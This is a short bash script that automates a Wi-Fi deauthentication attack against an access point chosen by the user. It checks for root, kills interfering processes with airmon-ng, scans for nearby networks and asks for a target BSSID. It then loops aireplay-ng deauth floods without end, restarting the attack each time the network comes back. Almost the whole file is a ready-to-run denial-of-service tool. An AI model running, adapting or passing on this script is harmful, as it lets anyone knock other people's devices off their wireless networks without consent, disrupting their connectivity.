#### Author: Jethr0-1 ####
#### Do not reuse without crediting me!!###
clear

if [ `whoami` != 'root' ] #Checks root status of user
  then
    echo '[!] Please run as root.'
    exit
fi
echo '[!] Checking for/killing processes that may interfere...'
airmon-ng check kill #Note for dev + users: Comment out this part of the script whenever you are testing and modifying the program
/etc/init.d/network-manager start
echo '[+] Done! Starting script...'
airmon-ng
echo '[?] Enter the name of the wireless interface you wish to use from the options above: '
read INTERFACE
echo '[+] This interface will be used to perform the deauth attack and scan for nearby access points.'
echo '[+] Starting AP scan in 5 seconds.'
echo '[!] Press q to stop the scan when you see your target AP show up, if it does not stop automatically.'
sleep 5
nmcli dev wifi
echo '[?] Enter the BSSID (MAC address) of the target access point: '
read AP
echo '[+] The target network is '$AP 
echo '[!] This attack will go until either you stop it, or the network resets itself. In which case, the attack will start again automatically until stopped.'
echo '[!] If at any time you wish to stop the script, just use CTRL+C'
echo '[!] Sleeping 10 seconds before commencing to display the above information...'
sleep 10s
echo '[+] Beginning attack'
while true
do
    aireplay-ng -0 0 -a $AP $INTERFACE
    echo ''
    echo ''
    echo '[!] Network was reset. Waiting 5 seconds and recommencing attack...'
    echo ''
    echo ''
    sleep 5s
done
